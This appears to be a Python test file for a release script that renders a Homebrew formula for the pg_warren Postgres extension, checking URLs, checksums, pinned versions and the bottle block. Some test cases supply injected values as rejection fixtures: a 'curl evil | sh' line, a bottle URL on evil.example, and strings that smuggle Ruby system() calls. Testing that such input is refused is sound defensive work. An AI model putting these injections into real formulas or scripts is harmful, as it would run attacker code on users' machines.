"""Tests of release/homebrew.py, which renders the tap's formula
(packaging/homebrew/pg_warren.rb.in) for a release: its source tarball's URL
and sha256, and the cargo-pgrx the source pins."""

import shutil
import subprocess

import pytest

from homebrew import HomebrewError, bottle_block, from_source, render

SHA = "a" * 64


def test_the_formula_names_the_releases_source_tarball_and_its_sha256():
    formula = render("0.7.0", SHA, "0.19.3")
    assert 'url "https://github.com/ExaDev/pg_warren/releases/download/v0.7.0/pg_warren-0.7.0.tar.gz"' in formula
    assert f'sha256 "{SHA}"' in formula


def test_the_formula_builds_with_the_cargo_pgrx_the_source_pins():
    assert '"cargo-pgrx", "--version", "0.19.3", "--locked"' in render("0.7.0", SHA, "0.19.3")


def test_every_placeholder_is_filled():
    assert "@" not in render("0.7.0", SHA, "0.19.3").replace("postgresql@", "")


def test_the_formula_builds_for_homebrews_postgresql_and_says_to_preload():
    formula = render("0.7.0", SHA, "0.19.3")
    assert 'depends_on "postgresql@17" => [:build, :test]' in formula
    assert 'depends_on "postgresql@18" => [:build, :test]' in formula
    assert "shared_preload_libraries" in formula and "CREATE EXTENSION pg_warren" in formula


@pytest.mark.parametrize("version, sha, pgrx", [
    ("0.7", SHA, "0.19.3"),
    ("0.7.0", "abc", "0.19.3"),
    ("0.7.0", SHA, "0.19"),
    ('0.7.0"; system "x', SHA, "0.19.3"),
])
def test_malformed_values_are_refused(version, sha, pgrx):
    with pytest.raises(HomebrewError):
        render(version, sha, pgrx)


@pytest.mark.skipif(shutil.which("ruby") is None, reason="needs ruby")
def test_the_rendered_formula_is_ruby(tmp_path):
    path = tmp_path / "pg_warren.rb"
    path.write_text(render("0.7.0", SHA, "0.19.3"))
    done = subprocess.run(["ruby", "-c", str(path)], capture_output=True, text=True)
    assert done.returncode == 0, done.stderr


ROOT_URL = "https://github.com/ExaDev/pg_warren/releases/download/v0.7.0"
BOTTLE = f'''  bottle do
    root_url "{ROOT_URL}"
    sha256 cellar: :any_skip_relocation, arm64_sequoia: "{"b" * 64}"
  end
'''


def built(bottle=BOTTLE, extra=""):
    """The formula as the bottle job leaves it: rendered, then the block
    `brew bottle --merge --write` adds after the license."""
    formula = render("0.7.0", SHA, "0.19.3")
    return formula.replace('  license "Apache-2.0"\n', f'  license "Apache-2.0"\n\n{bottle}{extra}')


def test_the_bottle_block_is_taken_from_the_built_formula():
    assert bottle_block(built(), ROOT_URL) == BOTTLE


def test_the_published_formula_is_rendered_again_with_only_the_bottle_block():
    formula = render("0.7.0", SHA, "0.19.3", bottle_block(built(), ROOT_URL))
    assert formula == built()


@pytest.mark.parametrize("bottle", [
    BOTTLE.replace(ROOT_URL, "https://evil.example/v0.7.0"),
    BOTTLE.replace(ROOT_URL, ROOT_URL.replace("v0.7.0", "v0.6.0")),
    BOTTLE.replace('  end\n', '    system "curl evil | sh"\n  end\n'),
    BOTTLE.replace('"' + "b" * 64 + '"', '"abc"'),
    BOTTLE.replace("arm64_sequoia", 'arm64_sequoia: "x", "y" => ""; system("x")'),
])
def test_a_bottle_block_of_another_shape_is_refused(bottle):
    with pytest.raises(HomebrewError, match="bottle"):
        bottle_block(built(bottle), ROOT_URL)


def test_a_formula_without_a_bottle_block_is_refused():
    with pytest.raises(HomebrewError, match="bottle"):
        bottle_block(render("0.7.0", SHA, "0.19.3"), ROOT_URL)


def test_two_bottle_blocks_are_refused():
    with pytest.raises(HomebrewError, match="bottle"):
        bottle_block(built(extra="\n" + BOTTLE), ROOT_URL)


def test_the_version_sha256_and_pgrx_come_from_the_source_tarball(tmp_path):
    import hashlib
    import io
    import tarfile
    tarball = tmp_path / "pg_warren-0.7.0.tar.gz"
    lock = b'version = 4\n\n[[package]]\nname = "pgrx"\nversion = "0.19.3"\n'
    with tarfile.open(tarball, "w:gz") as archive:
        info = tarfile.TarInfo("pg_warren-0.7.0/Cargo.lock")
        info.size = len(lock)
        archive.addfile(info, io.BytesIO(lock))
    assert from_source(tarball) == ("0.7.0", hashlib.sha256(tarball.read_bytes()).hexdigest(), "0.19.3")
